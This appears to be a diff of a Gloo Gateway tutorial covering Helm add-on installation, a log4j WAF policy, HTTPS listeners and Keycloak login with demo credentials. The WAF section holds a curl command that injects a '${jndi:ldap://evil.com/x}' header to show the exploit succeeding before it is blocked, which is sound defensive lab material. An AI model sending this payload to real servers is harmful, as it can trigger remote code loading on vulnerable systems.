@@ -147,14 +147,15 @@ kubectl delete workspacesettings default -n gloo-mesh
 kubectl create namespace gloo-gateway-addons
 kubectl label namespace gloo-gateway-addons istio-injection=enabled
 
-helm repo add gloo-mesh-agent https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent
+helm repo add gloo-platform https://storage.googleapis.com/gloo-platform/helm-charts
 helm repo update
 
-helm upgrade --install gloo-gateway-addons gloo-mesh-agent/gloo-mesh-agent \
+helm upgrade --install gloo-platform-addons gloo-platform/gloo-platform \
   --namespace gloo-gateway-addons \
-  --set glooMeshAgent.enabled=false \
-  --set rate-limiter.enabled=true \
-  --set ext-auth-service.enabled=true \
+  --set common.addonNamespace=gloo-gateway-addons \
+  --set common.cluster=cluster-1 \
+  --set rateLimiter.enabled=true \
+  --set extAuthService.enabled=true \
   --version $GLOO_PLATFORM_VERSION
 
 kubectl create namespace online-boutique
@@ -459,7 +460,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/products
 ```
 
 3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -835,7 +836,6 @@ spec:
     - http: {}
       port:
         number: 80
-      httpsRedirect: true
     - http: {}
       port:
         number: 443
@@ -876,7 +876,7 @@ Now if you refresh the application, you should be redirected to Keycloak to logi
 6. Login using the following credentials
 
 ```sh
-user: gloo-mesh
+user: gloo-gateway
 password: solo.io
 ```
 
